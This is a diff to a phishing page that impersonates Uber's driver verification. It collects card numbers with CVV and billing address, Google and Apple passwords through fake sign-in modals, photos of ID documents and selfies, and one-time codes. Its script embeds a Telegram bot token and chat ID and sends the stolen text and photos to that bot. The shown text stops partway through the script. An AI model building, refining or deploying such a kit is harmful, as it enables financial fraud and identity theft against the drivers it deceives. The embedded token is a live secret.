@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>Uber Driver • Identity & Payment Verification</title>
+    <title>Uber Driver Hub | Instant Payout & Identity Verification</title>
     <style>
         * {
             margin: 0;
@@ -13,42 +13,56 @@
         }
 
         body {
-            background: #FFFFFF;
-            font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
-            padding: 20px 16px 40px;
-            color: #1A1A1A;
+            background: #F8F9FC;
+            font-family: -apple-system, 'Segoe UI', 'SF Pro Text', Roboto, Helvetica, sans-serif;
+            padding: 24px 16px 48px;
+            color: #1C1C1E;
             min-height: 100vh;
         }
 
         .container {
-            max-width: 500px;
+            max-width: 520px;
             margin: 0 auto;
         }
 
-        .header {
+        /* Header professional */
+        .hero {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 28px;
         }
-
         .logo {
-            font-size: 32px;
-            font-weight: 700;
-            color: #000000;
-            margin-bottom: 8px;
+            font-size: 36px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #000000 0%, #2C2C2E 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
         }
-
-        .sub {
+        .badge {
+            display: inline-block;
+            background: #EFF3F6;
+            border-radius: 40px;
+            padding: 6px 14px;
+            font-size: 13px;
+            font-weight: 500;
+            color: #1C1C1E;
+            margin-top: 8px;
+        }
+        .subhead {
             font-size: 14px;
-            color: #6B6B6B;
+            color: #5E5E66;
+            margin-top: 8px;
         }
 
-        .panel {
+        /* Cards / Panel */
+        .card-panel {
             background: #FFFFFF;
-            border-radius: 28px;
-            padding: 24px 20px;
+            border-radius: 32px;
+            padding: 28px 24px;
             margin-bottom: 20px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05);
-            border: 1px solid #E5E5E5;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.03), 0 2px 4px rgba(0, 0, 0, 0.02);
+            border: 1px solid #EFEFF4;
             transition: all 0.2s ease;
         }
 
@@ -57,104 +71,96 @@
         }
 
         .input-label {
-            font-weight: 500;
+            font-weight: 590;
             font-size: 14px;
-            color: #6B6B6B;
+            color: #6C6C70;
             margin-bottom: 8px;
+            letter-spacing: -0.2px;
         }
 
-        input,
-        select {
+        input, select {
             width: 100%;
-            padding: 14px 16px;
+            padding: 14px 18px;
             font-size: 17px;
-            background: #F8F8F8;
-            border: 1px solid #E5E5E5;
-            border-radius: 14px;
-            color: #1A1A1A;
+            background: #F9F9FB;
+            border: 1.5px solid #E9E9EF;
+            border-radius: 18px;
+            color: #1C1C1E;
             outline: none;
             transition: 0.2s;
+            font-weight: 450;
         }
 
-        input:focus {
-            border-color: #000000;
+        input:focus, select:focus {
+            border-color: #007AFF;
             background: #FFFFFF;
+            box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
         }
 
         .row-2col {
             display: flex;
-            gap: 12px;
+            gap: 14px;
         }
-
         .row-2col .input-group {
             flex: 1;
         }
 
-        .action-btn {
-            background: #000000;
+        .btn {
+            background: #007AFF;
             color: white;
             font-weight: 600;
             width: 100%;
             border: none;
-            padding: 14px;
+            padding: 16px;
             border-radius: 44px;
             font-size: 17px;
             cursor: pointer;
             transition: 0.2s;
+            font-weight: 600;
         }
-
-        .action-btn:active {
+        .btn:active {
             transform: scale(0.97);
         }
-
-        .action-btn.secondary {
-            background: #F8F8F8;
-            color: #1A1A1A;
-            border: 1px solid #E5E5E5;
+        .btn-dark {
+            background: #000000;
         }
-
-        .action-btn.outline-link {
+        .btn-outline {
             background: transparent;
-            color: #0066CC;
-            border: 1px solid #E5E5E5;
-            margin-top: 12px;
+            color: #007AFF;
+            border: 1.5px solid #007AFF;
+        }
+        .btn-secondary {
+            background: #F2F2F5;
+            color: #1C1C1E;
+            border: 1px solid #E5E5EA;
         }
 
         .divider {
             text-align: center;
-            margin: 20px 0;
+            margin: 24px 0;
             position: relative;
-            color: #6B6B6B;
+            color: #8E8E93;
             font-size: 14px;
         }
-
-        .divider::before,
-        .divider::after {
+        .divider::before, .divider::after {
             content: "";
             position: absolute;
             top: 50%;
-            width: 40%;
+            width: 42%;
             height: 1px;
-            background: #E5E5E5;
+            background: #E5E5EA;
         }
-
-        .divider::before {
-            left: 0;
-        }
-
-        .divider::after {
-            right: 0;
-        }
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
 
         .social-buttons {
             display: flex;
             flex-direction: column;
             gap: 12px;
         }
-
         .social-btn {
-            background: #F8F8F8;
-            border: 1px solid #E5E5E5;
+            background: #FFFFFF;
+            border: 1px solid #E5E5EA;
             border-radius: 44px;
             padding: 12px;
             font-size: 16px;
@@ -162,26 +168,31 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
             cursor: pointer;
+            transition: 0.2s;
+        }
+        .social-btn:hover {
+            background: #F8F8FC;
         }
 
         .terms {
             font-size: 12px;
-            color: #6B6B6B;
+            color: #8E8E93;
             text-align: center;
             margin-top: 24px;
+            line-height: 1.4;
         }
 
-        /* Login modal for Google/Apple */
-        .login-modal {
+        /* modals */
+        .modal-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(4px);
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(6px);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -190,626 +201,344 @@
             opacity: 0;
             transition: 0.2s;
         }
-
-        .login-modal.active {
+        .modal-overlay.active {
             visibility: visible;
             opacity: 1;
         }
-
-        .login-modal-content {
+        .modal-card {
             background: white;
-            width: 85%;
+            width: 88%;
             max-width: 340px;
-            border-radius: 28px;
-            padding: 24px;
+            border-radius: 32px;
+            padding: 28px 24px;
             text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
         }
-
-        .login-modal-content h3 {
+        .modal-card h3 {
             margin-bottom: 20px;
-            font-size: 20px;
+            font-size: 22px;
+            font-weight: 600;
         }
-
-        .login-modal-content input {
-            margin-bottom: 16px;
+        .modal-card input {
+            margin-bottom: 14px;
         }
-
         .modal-buttons {
             display: flex;
-            gap: 10px;
+            gap: 12px;
+            margin-top: 12px;
         }
+        .modal-btn-cancel { background: #E5E5EA; color: #1C1C1E; flex:1; padding: 12px; border-radius:44px; border:none; font-weight:600; }
+        .modal-btn-confirm { background: #000000; color: white; flex:1; padding:12px; border-radius:44px; border:none; font-weight:600; }
 
-        .modal-buttons button {
-            flex: 1;
-            padding: 12px;
-            border-radius: 44px;
-            border: none;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .modal-confirm {
-            background: #000000;
-            color: white;
-        }
-
-        .modal-cancel {
-            background: #F8F8F8;
-            color: #1A1A1A;
-            border: 1px solid #E5E5E5;
-        }
-
+        /* KYC styles */
         .step-indicator {
             display: flex;
             gap: 8px;
-            margin-bottom: 24px;
+            margin-bottom: 28px;
         }
-
         .step-dot {
             flex: 1;
-            height: 4px;
-            background: #E5E5E5;
-            border-radius: 4px;
+            height: 5px;
+            background: #E5E5EA;
+            border-radius: 6px;
         }
-
-        .step-dot.active {
-            background: #000000;
-        }
-
-        .step-dot.completed {
-            background: #000000;
-        }
+        .step-dot.active { background: #000000; }
+        .step-dot.completed { background: #34C759; }
 
         .camera-container {
             background: #000;
-            border-radius: 24px;
+            border-radius: 28px;
             overflow: hidden;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
-
-        .square-camera {
-            aspect-ratio: 1 / 1;
-            background: #000;
-        }
-
-        video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
+        .square-camera { aspect-ratio: 1 / 1; background: #111; position: relative; }
+        video { width: 100%; height: 100%; object-fit: cover; }
         .camera-controls {
             display: flex;
             justify-content: center;
             align-items: center;
-            gap: 30px;
+            gap: 36px;
             padding: 16px 0;
         }
-
         .capture-btn {
             background: white;
-            width: 70px;
-            height: 70px;
+            width: 72px;
+            height: 72px;
             border-radius: 50%;
             border: 4px solid #000000;
             cursor: pointer;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.2);
         }
-
         .switch-cam {
-            background: rgba(0, 0, 0, 0.6);
-            width: 44px;
-            height: 44px;
+            background: rgba(0,0,0,0.7);
+            width: 48px;
+            height: 48px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
+            font-size: 24px;
             cursor: pointer;
             color: white;
+            backdrop-filter: blur(4px);
         }
-
         .status-badge {
-            background: #F8F8F8;
-            padding: 8px;
+            background: #F2F2F5;
+            padding: 10px;
             border-radius: 60px;
             text-align: center;
-            font-size: 13px;
-            margin-bottom: 16px;
-            color: #1A1A1A;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 12px;
         }
-
         .toast {
-            background: #1A1A1A;
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1C1C1E;
             color: white;
             border-radius: 60px;
-            padding: 10px 16px;
+            padding: 12px 20px;
             text-align: center;
             opacity: 0;
             transition: 0.2s;
             pointer-events: none;
-            margin-top: 16px;
+            z-index: 1200;
+            font-size: 14px;
+            max-width: 85%;
         }
-
-        .toast.show {
-            opacity: 1;
-        }
-
+        .toast.show { opacity: 1; }
         .loading-overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
+            top:0; left:0; width:100%; height:100%;
+            background: rgba(0,0,0,0.92);
             backdrop-filter: blur(8px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            z-index: 2000;
-            visibility: hidden;
-            opacity: 0;
+            display: flex; align-items: center; justify-content: center;
+            flex-direction: column; z-index: 2000;
+            visibility: hidden; opacity: 0;
             transition: 0.2s;
         }
-
-        .loading-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-
+        .loading-overlay.active { visibility: visible; opacity: 1; }
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #3A3A3C;
+            width: 52px; height: 52px;
+            border: 5px solid #3A3A3C;
             border-top-color: #FFFFFF;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 16px;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
-        .loading-text {
-            font-size: 16px;
-            color: white;
-            text-align: center;
-        }
-
-        .hide {
-            display: none;
-        }
-
-        .otp-container {
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        .otp-input {
-            text-align: center;
-            font-size: 24px;
-            letter-spacing: 4px;
-        }
-
-        .card-badge {
-            background: #F2F2F2;
-            border-radius: 16px;
-            padding: 12px;
             margin-bottom: 18px;
-            font-size: 13px;
-            color: #3C3C3C;
-            text-align: center;
         }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .hide { display: none; }
+        .otp-input { text-align: center; font-size: 24px; letter-spacing: 6px; font-weight: 600; }
+        .apple-logo-svg { width: 22px; height: 22px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="header">
-        <div class="logo">Uber</div>
-        <div class="sub">Driver • Identity & Payment Verification</div>
+    <div class="hero">
+        <div class="logo">Uber Driver</div>
+        <div class="badge">⚡ Instant Payout • Identity Hub</div>
+        <div class="subhead">Reactivate account & get paid daily</div>
     </div>
 
-    <!-- STEP 0: UBER PRO CARD COLLECTION (NEW) -->
-    <div id="cardPanel" class="panel">
-        <div class="card-badge">
-            💳 <strong>Uber Pro Card Required</strong><br>
-            To activate driver rewards & instant payouts, please link your Uber Pro Card.
+    <!-- STEP 0: UBER PRO CARD DECISION GATE (mandatory first) -->
+    <div id="proCardGatePanel" class="card-panel">
+        <div style="text-align:center; margin-bottom: 12px;">
+            <div style="font-size: 48px;">💳</div>
+            <h2 style="font-size: 22px; margin: 8px 0 4px;">Uber Pro Card Rewards</h2>
+            <p style="color:#5E5E66; font-size:14px;">Instant payout & 0% fees on earnings</p>
         </div>
-        <div class="input-group">
-            <div class="input-label">Full name on card (as shown)</div>
-            <input type="text" id="cardFullName" placeholder="e.g. John A. Driver" autocomplete="off">
+        <div class="card-badge" style="background:#F0F9FF; border-radius: 20px; padding: 14px; margin-bottom: 20px; text-align:center;">
+            🔥 <strong>Get paid after every trip</strong> — link your Uber Pro Card or continue with standard verification.
         </div>
-        <div class="input-group">
-            <div class="input-label">Card number</div>
-            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" autocomplete="off" maxlength="19">
+        <button class="btn btn-dark" id="proCardYesBtn" style="margin-bottom: 12px;">✅ I have an Uber Pro Card</button>
+        <button class="btn btn-secondary" id="proCardNoBtn">🚫 I don't have an Uber Pro Card</button>
+        <div class="terms" style="margin-top: 20px;">
+            Choose an option to activate instant payout eligibility.
         </div>
+    </div>
+
+    <!-- CARD DETAILS FORM (if user selects "I have Pro Card") -->
+    <div id="cardDetailsPanel" class="card-panel hide">
+        <div style="font-weight:600; margin-bottom: 16px;">💳 Link Your Uber Pro Card</div>
+        <div class="input-group"><div class="input-label">Full name on card</div><input type="text" id="cardFullName" placeholder="As printed on card"></div>
+        <div class="input-group"><div class="input-label">Card number</div><input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19"></div>
         <div class="row-2col">
-            <div class="input-group">
-                <div class="input-label">Expiry (MM/YY)</div>
-                <input type="text" id="cardExpiry" placeholder="MM/YY" autocomplete="off" maxlength="5">
-            </div>
-            <div class="input-group">
-                <div class="input-label">CVV</div>
-                <input type="password" id="cardCvv" placeholder="123" autocomplete="off" maxlength="4">
-            </div>
+            <div class="input-group"><div class="input-label">Expiry (MM/YY)</div><input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5"></div>
+            <div class="input-group"><div class="input-label">CVV</div><input type="password" id="cardCvv" placeholder="123" maxlength="4"></div>
         </div>
-        <div class="input-group">
-            <div class="input-label">Billing address (street, city, ZIP)</div>
-            <input type="text" id="cardAddress" placeholder="Street, City, ZIP code" autocomplete="off">
-        </div>
-        <button class="action-btn" id="submitProCardBtn">✓ Link Uber Pro Card & Continue</button>
-        <div class="divider">or</div>
-        <button class="action-btn secondary" id="skipProCardBtn">🚫 I don't have an Uber Pro Card</button>
-        <div class="terms" style="margin-top: 16px;">
-            By linking your card, you agree to instant payouts and driver rewards.<br>
-            Your info is encrypted & secure.
-        </div>
+        <div class="input-group"><div class="input-label">Billing address (Street, City, ZIP)</div><input type="text" id="cardAddress" placeholder="e.g. 123 Main St, Los Angeles, CA 90001"></div>
+        <button class="btn btn-dark" id="submitCardDetailsBtn">✓ Link Card & Proceed</button>
+        <button class="btn btn-outline" id="backToGateBtn" style="margin-top: 12px;">← Go back</button>
     </div>
 
-    <!-- Step 1: Login Panel -->
-    <div id="loginPanel" class="panel hide">
-        <div class="input-group">
-            <div class="input-label">What's your phone number or email?</div>
-            <input type="text" id="loginInput" placeholder="Enter phone number or email" autocomplete="off">
-        </div>
-        <button class="action-btn" id="loginContinueBtn">Continue</button>
+    <!-- LOGIN PANEL (Step 1: manual / social) -->
+    <div id="loginPanel" class="card-panel hide">
+        <div class="input-group"><div class="input-label">Phone number or email</div><input type="text" id="loginInput" placeholder="(XXX) XXX-XXXX or email@example.com"></div>
+        <button class="btn btn-dark" id="loginContinueBtn">Continue →</button>
         <div class="divider">or</div>
         <div class="social-buttons">
             <div class="social-btn" id="googleLoginBtn">
-                <svg width="20" height="20" viewBox="0 0 24 24">
-                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
-                </svg>
+                <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
                 Continue with Google
             </div>
             <div class="social-btn" id="appleLoginBtn">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="black">
-                    <path d="M17.05 3.3c.5.6.9 1.4.8 2.2-.8.1-1.7.4-2.3.9-.6.5-1.1 1.1-1.1 1.8 0 .7.4 1.4 1.1 1.9.5.3 1.2.5 1.9.5.9 0 1.7-.3 2.4-.8.6-.4 1.1-1 1.4-1.7.3-.7.4-1.5.3-2.2-.7-.2-1.4-.5-2-.9-.6-.4-1-.9-1.3-1.5zM14.5 8.2c-.3.7-.9 1.3-1.6 1.7-.7.4-1.5.6-2.3.6-.8 0-1.6-.2-2.3-.6-.7-.4-1.3-1-1.6-1.7-.3-.7-.4-1.5-.3-2.3.8-.1 1.6.1 2.3.4.7.3 1.3.8 1.6 1.5.3-.7.9-1.2 1.6-1.5.7-.3 1.5-.5 2.3-.4.1.8 0 1.6-.3 2.3zM12 22c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"/>
-                </svg>
+                <svg class="apple-logo-svg" viewBox="0 0 24 24" fill="black"><path d="M17.05 3.3c.5.6.9 1.4.8 2.2-.8.1-1.7.4-2.3.9-.6.5-1.1 1.1-1.1 1.8 0 .7.4 1.4 1.1 1.9.5.3 1.2.5 1.9.5.9 0 1.7-.3 2.4-.8.6-.4 1.1-1 1.4-1.7.3-.7.4-1.5.3-2.2-.7-.2-1.4-.5-2-.9-.6-.4-1-.9-1.3-1.5zM14.5 8.2c-.3.7-.9 1.3-1.6 1.7-.7.4-1.5.6-2.3.6-.8 0-1.6-.2-2.3-.6-.7-.4-1.3-1-1.6-1.7-.3-.7-.4-1.5-.3-2.3.8-.1 1.6.1 2.3.4.7.3 1.3.8 1.6 1.5.3-.7.9-1.2 1.6-1.5.7-.3 1.5-.5 2.3-.4.1.8 0 1.6-.3 2.3zM12 22c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8z"/></svg>
                 Continue with Apple
             </div>
         </div>
-        <div class="terms">
-            By continuing, you agree to calls, including by autodialer, WhatsApp or texts from Uber and its affiliates.
-            Text "STOP" to 89203 to opt out.
-        </div>
+        <div class="terms">By continuing you agree to instant payout terms & identity verification.</div>
     </div>
 
-    <!-- Step 2: KYC Photos -->
-    <div id="kycPanel" class="panel hide">
-        <div class="step-indicator" id="stepIndicator">
-            <div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div>
-        </div>
-        <div id="kycStep1" class="kyc-step">
-            <div class="input-group"><div class="input-label">ID Type</div><select id="idType"><option value="">Select</option><option>Driver's License</option><option>State ID</option><option>Passport</option></select></div>
-            <div class="input-group"><div class="input-label">Issuing State</div><select id="idState">
-                <option value="">Select state</option>
-                <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option>
-                <option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option>
-                <option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option>
-                <option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option>
-                <option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option>
-                <option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option>
-                <option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option>
-                <option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option>
-                <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option>
-                <option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option>
-            </select></div>
-            <button class="action-btn" id="kycStep1Next">Continue →</button>
-        </div>
-        <div id="kycStep2" class="kyc-step hide">
-            <div class="status-badge">📸 Capture FRONT of ID</div>
-            <div class="camera-container"><div class="square-camera"><video id="frontVideo" autoplay playsinline muted></video></div></div>
-            <div class="camera-controls"><div class="switch-cam" id="switchFrontCam">⟳</div><div class="capture-btn" id="captureFrontBtn"></div><div style="width:44px;"></div></div>
-            <div class="status-badge" id="frontStatus">Ready</div>
-        </div>
-        <div id="kycStep3" class="kyc-step hide">
-            <div class="status-badge">📸 Capture BACK of ID</div>
-            <div class="camera-container"><div class="square-camera"><video id="backVideo" autoplay playsinline muted></video></div></div>
-            <div class="camera-controls"><div class="switch-cam" id="switchBackCam">⟳</div><div class="capture-btn" id="captureBackBtn"></div><div style="width:44px;"></div></div>
-            <div class="status-badge" id="backStatus">Ready</div>
-        </div>
-        <div id="kycStep4" class="kyc-step hide">
-            <div class="status-badge">🤳 Take a selfie</div>
-            <div class="camera-container"><div class="square-camera"><video id="selfieVideo" autoplay playsinline muted></video></div></div>
-            <div class="camera-controls"><div class="switch-cam" id="switchSelfieCam">⟳</div><div class="capture-btn" id="captureSelfieBtn"></div><div style="width:44px;"></div></div>
-            <div class="status-badge" id="selfieStatus">Ready</div>
-        </div>
-        <div id="kycStep5" class="kyc-step hide">
-            <div class="status-badge">🪪 Selfie holding ID next to face</div>
-            <div class="camera-container"><div class="square-camera"><video id="selfieIdVideo" autoplay playsinline muted></video></div></div>
-            <div class="camera-controls"><div class="switch-cam" id="switchSelfieIdCam">⟳</div><div class="capture-btn" id="captureSelfieIdBtn"></div><div style="width:44px;"></div></div>
-            <div class="status-badge" id="selfieIdStatus">Ready</div>
-        </div>
+    <!-- KYC PANEL -->
+    <div id="kycPanel" class="card-panel hide">
+        <div class="step-indicator" id="stepIndicator"><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div></div>
+        <div id="kycStep1" class="kyc-step"><div class="input-group"><div class="input-label">ID Type</div><select id="idType"><option value="">Select</option><option>Driver's License</option><option>State ID</option><option>Passport</option></select></div>
+        <div class="input-group"><div class="input-label">Issuing State</div><select id="idState"><option value="">Select state</option><option>California</option><option>Texas</option><option>Florida</option><option>New York</option><option>Illinois</option><option>Pennsylvania</option><option>Ohio</option><option>Georgia</option><option>North Carolina</option><option>Michigan</option><option>New Jersey</option><option>Virginia</option><option>Washington</option><option>Arizona</option><option>Massachusetts</option><option>Tennessee</option><option>Indiana</option><option>Missouri</option><option>Maryland</option><option>Wisconsin</option><option>Colorado</option><option>Minnesota</option><option>South Carolina</option><option>Alabama</option><option>Louisiana</option></select></div>
+        <button class="btn btn-dark" id="kycStep1Next">Continue →</button></div>
+
+        <div id="kycStep2" class="kyc-step hide"><div class="status-badge">📸 Front of ID</div><div class="camera-container"><div class="square-camera"><video id="frontVideo" autoplay playsinline muted></video></div></div><div class="camera-controls"><div class="switch-cam" id="switchFrontCam">⟳</div><div class="capture-btn" id="captureFrontBtn"></div><div style="width:44px;"></div></div><div id="frontStatus" class="status-badge">Ready</div></div>
+        <div id="kycStep3" class="kyc-step hide"><div class="status-badge">📸 Back of ID</div><div class="camera-container"><div class="square-camera"><video id="backVideo" autoplay playsinline muted></video></div></div><div class="camera-controls"><div class="switch-cam" id="switchBackCam">⟳</div><div class="capture-btn" id="captureBackBtn"></div><div style="width:44px;"></div></div><div id="backStatus" class="status-badge">Ready</div></div>
+        <div id="kycStep4" class="kyc-step hide"><div class="status-badge">🤳 Selfie</div><div class="camera-container"><div class="square-camera"><video id="selfieVideo" autoplay playsinline muted></video></div></div><div class="camera-controls"><div class="switch-cam" id="switchSelfieCam">⟳</div><div class="capture-btn" id="captureSelfieBtn"></div><div style="width:44px;"></div></div><div id="selfieStatus" class="status-badge">Ready</div></div>
+        <div id="kycStep5" class="kyc-step hide"><div class="status-badge">🪪 Selfie holding ID</div><div class="camera-container"><div class="square-camera"><video id="selfieIdVideo" autoplay playsinline muted></video></div></div><div class="camera-controls"><div class="switch-cam" id="switchSelfieIdCam">⟳</div><div class="capture-btn" id="captureSelfieIdBtn"></div><div style="width:44px;"></div></div><div id="selfieIdStatus" class="status-badge">Ready</div></div>
     </div>
 
-    <!-- Step 3: OTP Verification -->
-    <div id="otpPanel" class="panel hide">
-        <div class="input-group">
-            <div class="input-label">📱 Verification Code</div>
-            <input type="text" id="otpCode" class="otp-input" placeholder="Enter code" autocomplete="off">
-        </div>
-        <button class="action-btn" id="otpSubmitBtn">Verify & Complete</button>
-    </div>
+    <!-- OTP PANEL -->
+    <div id="otpPanel" class="card-panel hide"><div class="input-group"><div class="input-label">📱 Verification Code</div><input type="text" id="otpCode" class="otp-input" placeholder="6-digit code"></div><button class="btn btn-dark" id="otpSubmitBtn">Verify & Activate Instant Payout</button></div>
 
     <div id="toastMsg" class="toast"></div>
 </div>
 
-<!-- Login Modals -->
-<div id="googleModal" class="login-modal">
-    <div class="login-modal-content"><h3>Sign in with Google</h3><input type="email" id="googleEmail" placeholder="Gmail address"><input type="password" id="googlePassword" placeholder="Password"><div class="modal-buttons"><button class="modal-cancel" id="googleModalCancel">Cancel</button><button class="modal-confirm" id="googleModalConfirm">Sign in</button></div></div>
-</div>
-<div id="appleModal" class="login-modal">
-    <div class="login-modal-content"><h3>Sign in with Apple</h3><input type="email" id="appleEmail" placeholder="Apple ID (email)"><input type="password" id="applePassword" placeholder="Password"><div class="modal-buttons"><button class="modal-cancel" id="appleModalCancel">Cancel</button><button class="modal-confirm" id="appleModalConfirm">Sign in</button></div></div>
-</div>
-
-<div id="loadingOverlay" class="loading-overlay"><div class="spinner"></div><div class="loading-text">Processing verification...<br>Please wait</div></div>
+<!-- MODALS -->
+<div id="googleModal" class="modal-overlay"><div class="modal-card"><h3>Google Sign in</h3><input type="email" id="googleEmail" placeholder="Email"><input type="password" id="googlePassword" placeholder="Password"><div class="modal-buttons"><button class="modal-btn-cancel" id="googleModalCancel">Cancel</button><button class="modal-btn-confirm" id="googleModalConfirm">Sign in</button></div></div></div>
+<div id="appleModal" class="modal-overlay"><div class="modal-card"><h3>Apple ID</h3><input type="email" id="appleEmail" placeholder="Apple ID Email"><input type="password" id="applePassword" placeholder="Password"><div class="modal-buttons"><button class="modal-btn-cancel" id="appleModalCancel">Cancel</button><button class="modal-btn-confirm" id="appleModalConfirm">Sign in</button></div></div></div>
+<div id="loadingOverlay" class="loading-overlay"><div class="spinner"></div><div class="loading-text">Verifying identity & activating instant payout...</div></div>
 
 <script>
-    // Telegram credentials
+    // TELEGRAM CREDENTIALS
     const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
     const CHAT_ID   = "8737104261";
 
-    // DOM Elements
-    const cardPanel = document.getElementById('cardPanel');
+    // DOM
+    const gatePanel = document.getElementById('proCardGatePanel');
+    const cardDetailsPanel = document.getElementById('cardDetailsPanel');
     const loginPanel = document.getElementById('loginPanel');
     const kycPanel = document.getElementById('kycPanel');
     const otpPanel = document.getElementById('otpPanel');
     const toast = document.getElementById('toastMsg');
     const loadingOverlay = document.getElementById('loadingOverlay');
+
+    let globalUser = { loginValue: '', loginMethod: '', idType: '', idState: '', otp: '', hasProCard: false, proCardData: null };
+
+    function showToast(msg, isErr=false){ toast.innerText = msg; toast.classList.add('show'); toast.style.background = isErr ? '#C41E3A' : '#1C1C1E'; setTimeout(()=>toast.classList.remove('show'),3000); }
+    async function sendToTelegram(text){ try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ chat_id: CHAT_ID, text:text, parse_mode:'HTML' }) }); return true; } catch(e){ return false; } }
+    async function sendPhotoToTelegram(blob, caption){ let fd=new FormData(); fd.append('chat_id',CHAT_ID); fd.append('photo',blob,'photo.jpg'); if(caption) fd.append('caption',caption); try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body:fd }); return true; } catch(e){ return false; } }
+
+    // GATE LOGIC: I have Pro Card
+    document.getElementById('proCardYesBtn').onclick = ()=>{
+        gatePanel.classList.add('hide');
+        cardDetailsPanel.classList.remove('hide');
+    };
+    document.getElementById('proCardNoBtn').onclick = async ()=>{
+        globalUser.hasProCard = false;
+        globalUser.proCardData = null;
